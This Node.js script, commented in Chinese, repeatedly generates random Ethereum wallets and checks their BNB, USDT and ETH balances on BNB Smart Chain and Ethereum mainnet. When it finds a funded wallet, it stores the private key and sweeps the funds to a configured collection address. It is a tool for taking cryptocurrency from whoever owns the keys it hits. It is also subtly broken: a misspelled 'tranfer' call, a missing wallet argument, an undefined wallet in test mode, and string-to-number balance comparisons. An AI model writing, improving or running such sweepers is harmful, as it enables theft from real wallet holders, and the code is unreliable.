require('dotenv').config();
const ethers = require('ethers');
const dbcommand = require('./db/dbcommand');
const config = require('./config/config');
const BSC_USDT_ABI = require('./abis/BSCUSDT.json');
const BSC_ETH_ABI = require('./abis/BSCETH.json');
const ETH_USDT_ABI = require('./abis/ETHUSDT.json');
const fs = require('fs');
const { collectAddress } = require('./config/config');
const filePath = './wallet.txt';
let counter = 0;

const BSC_PROVIDER = new ethers.providers.JsonRpcProvider(config.rpc.bsc.rpcs[Math.floor(Math.random() * config.rpc.bsc.rpcs.length)]);
const ETH_PROVIDER = new ethers.providers.JsonRpcProvider(config.rpc.eth.rpcs[Math.floor(Math.random() * config.rpc.eth.rpcs.length)]);

const BSC_USDT_CONTRACT = new ethers.Contract(config.contract.chain.bsc.USDT, BSC_USDT_ABI, BSC_PROVIDER);//bsc主网USDT合约
const BSC_ETH_CONTRACT = new ethers.Contract(config.contract.chain.bsc.ETH, BSC_ETH_ABI, BSC_PROVIDER)//bsc主网ETH合约
const ETH_USDT_CONTRACT = new ethers.Contract(config.contract.chain.eth.USDT, ETH_USDT_ABI, ETH_PROVIDER);//eth主网USDT合约


async function main(target) {
    let address;
    let wallet;
    if (target) {//提供测试程序功能
        address = target;
        console.log('测试地址', address);
    }
    else {
        wallet = ethers.Wallet.createRandom();//随机一个钱包
        address = wallet.address;//减少多次访问对象的开销，提升性能
    }
    const ETH_USDT_DECIMALS = await ETH_USDT_CONTRACT.decimals();//ETH_USDT精度
    const BSC_USDT_DECIMALS = await BSC_USDT_CONTRACT.decimals();//BSC_USDT精度

    const BSC_BNB_BALANCE = await BSC_PROVIDER.getBalance(address);//bsc主网BNB余额bigNumber
    const BSC_USDT_BALACNE = await BSC_USDT_CONTRACT.balanceOf(address)//bsc主网USDT余额bigNumber
    const BSC_ETH_BALACNE = await BSC_ETH_CONTRACT.balanceOf(address)//bsc主网ETH余额bigNumber

    const ETH_ETH_BALANCE = await ETH_PROVIDER.getBalance(address)//eth主网ETH余额bigNumber
    const ETH_USDT_BALACNE = await ETH_USDT_CONTRACT.balanceOf(address);//eth主网USDT余额bigNumber


    const BSC_BNB = ethers.utils.formatEther(BSC_BNB_BALANCE);//bsc主网BNB余额可读
    const BSC_USDT = ethers.utils.formatUnits(BSC_USDT_BALACNE, BSC_USDT_DECIMALS);//bsc主网USDT余额可读
    const BSC_ETH = ethers.utils.formatEther(BSC_ETH_BALACNE);//bsc主网ETH余额可读

    const ETH_ETH = ethers.utils.formatEther(ETH_ETH_BALANCE)//eth主网ETH余额可读
    const ETH_USDT = ethers.utils.formatUnits(ETH_USDT_BALACNE, ETH_USDT_DECIMALS)//eth主网USDT余额可读

    if (BSC_BNB > 0 || BSC_USDT > 0 || BSC_ETH > 0 || ETH_ETH > 0 || ETH_USDT > 0) {
        await appendFileFun(filePath, wallet.privateKey + '\n');//文件保存
        await dbcommand.saveWallet(wallet);//数据库保存
    }
    if (BSC_USDT > 0) {//如果BSC主网有USDT，暂不考虑是否有gas转账，当作这里gas充足，也可以自动化，判断有USDT，没gas，则写个机器人转入BNB，再转出USDT(也要防止gas骗局，即碰巧扫描到机器人钱包，如BSC链，有一定余额的USDT，但想要转账需要BNB作为交易费，如果你打入BNB想要转出USDT，你的BNB会被立即转走)
        await transferToken(BSC_USDT_CONTRACT, wallet, BSC_USDT_BALACNE);
    }
    if (BSC_ETH > 0) {//转出ETH
        await transferToken(BSC_ETH_CONTRACT, wallet, BSC_ETH_BALACNE);
    }
    if (BSC_BNB > 0) { //最后转出BNB
        await transferCoin(wallet, 'bnb');
    }
    if (ETH_USDT > 0) { //ETH主网转出USDT，同样需要eth作为gas
        await transferToken(ETH_USDT_CONTRACT, ETH_USDT_BALACNE);
    }
    if (ETH_ETH > 0) {//最后转出ETH
        await transferCoin(wallet, 'eth')
    }

    counter++;

    console.log({
        id: counter,
        address: wallet.address,
        "BSC主网BNB余额": BSC_BNB - 0,
        "BSC主网USDT余额": BSC_USDT - 0,
        "BSC主网ETH余额": BSC_ETH - 0,
        "ETH主网ETH余额": ETH_ETH - 0,
        "ETH主网USDT余额": ETH_USDT - 0
    })
}

//转生态币，主链原生币
async function transferCoin(wallet, symbol) {
    if (symbol == 'bnb') {
        const balance = await BSC_PROVIDER.getBalance(wallet.address);//再查一遍余额，防止万一前面转出过USDT或ETH，导致余额变化
        const gas = ethers.BigNumber.from(21000 * (3 * 10 ** 9));
        await wallet.sendTransaction({
            to: config.collectAddress,
            value: balance.sub(gas)
        }).wait()
    }
    if (symbol == 'eth') {
        const balance = await ETH_PROVIDER.getBalance(wallet.address);//以太坊钱包余额
        let tx = {
            to: collectAddress,
            value: balance
        }
        const gasLimit = await ETH_PROVIDER.estimateGas(tx);//得到gasLimit
        const gasPrice = await ETH_PROVIDER.getGasPrice();//得到gasPrice
        const txCost = gasLimit.mul(gasPrice)//得到花费在gas上的ETH数量bigNumber
        tx.value = balance.sub(txCost);//重新赋值转账金额减去gas
        await wallet.sendTransaction(tx).wait();//发起转账
    }
}

//转token，主链其它币
async function transferToken(token, wallet, amount) {
    await (await token.connect(wallet).tranfer(config.collectAddress, amount)).wait();
}


//追加写如file
async function appendFileFun(path, data) {
    return new Promise((res, rej) => {
        fs.appendFile(path, data, (err) => {
            if (err) {
                console.log(err);
                rej(err);
            } else {
                res()
            }
        })
    })
}

// async function loop() {
//     setTimeout(async () => {
//         await main();
//         loop()
//     }, 100);
// } loop()


setInterval(async () => {
    await main()
}, Math.floor(Math.random() * (1000 - 300) + 300));
